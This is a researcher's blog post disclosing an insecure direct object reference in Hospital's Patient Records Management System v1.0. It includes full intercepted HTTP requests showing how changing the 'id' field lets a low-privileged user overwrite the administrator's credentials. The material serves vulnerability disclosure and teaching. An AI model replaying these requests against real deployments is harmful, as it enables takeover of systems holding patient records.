---
layout: post
title:  "Hospitals Patient Records Management System v1.0 — IDOR (Account Takeover)"
date:   2021-12-20 20:00:19 +0700
author: twseptian
pin: true
categories: [Infosec, CVE, Research]
tags: [cve, infosec]
---

```
- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' Insecure direct object references (IDOR) leads to Account TakeOver
- Date: 2021-12-30
- Exploit Author: twseptian
- Vendor Homepage: https://www.sourcecodester.com/php/15116/hospitals-patient-records-management-system-php-free-source-code.html
- Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/hprms_0.zip
- Version: v1.0
- Tested on: Kali Linux 2021.4
- Exploit-DB link: https://www.exploit-db.com/exploits/50631
```

## Introduction

I reviewed HPRMS v1.0 to assess how its admin area handles identity and authorization in routine CRUD flows. Applications with profile-edit features often expose object identifiers directly, and these are prime candidates for insecure direct object references (IDOR). My goal was to trace the update path for user profiles, verify whether object access was enforced server-side, and confirm the impact if it was not.

---

## Summary of the Finding
The user profile update flow in HPRMS v1.0 contains an insecure direct object reference (IDOR) that allows any authenticated low-privileged user to modify other users’ accounts, including the built-in administrator, by altering the client-supplied id parameter in the update request. Because the backend trusts this identifier without verifying ownership or enforcing object-level authorization, an attacker can overwrite the administrator’s username and password and then sign in as admin, effectively achieving full account takeover. This stems from missing server-side access controls on update operations and the reliance on a predictable, user-controlled object identifier.

---


## Reproduction steps (tested on local instance)
> Performed only on a local test instance for verification and learning.

- Authenticate as a low-privilege user (for example, `user1`, id `4`).  
- Open the account/profile update form and trigger a profile save operation.  
- Intercept the outgoing `POST` to `classes/Users.php?f=save`. The request contains fields such as `id`, `firstname`, `lastname`, `username`, `password`, and `img`.

```http
POST /hprms/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239
Content-Length: 806
Origin: http://localhost
Connection: close
Referer: http://localhost/hprms/admin/?page=user
Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="id"

4
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="firstname"

user1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="lastname"

admin
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="username"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="password"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------17632878732301879013646251239--
```

- Change `id` from `4` to the administrator id (commonly `1`) and alter the `username`/`password` values in the intercepted request.

```http
POST /hprms/classes/Users.php?f=save HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------17632878732301879013646251239
Content-Length: 806
Origin: http://localhost
Connection: close
Referer: http://localhost/hprms/admin/?page=user
Cookie: PHPSESSID=32kl57ct3p8nsicsrp8dte2c50
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="id"

1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="firstname"

user1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="lastname"

admin
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="username"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="password"

admin1
-----------------------------17632878732301879013646251239
Content-Disposition: form-data; name="img"; filename=""
Content-Type: application/octet-stream


-----------------------------17632878732301879013646251239--
```

- Forward the modified request. If the server accepts it without validating ownership or role, the attacker has effectively taken over the admin account.

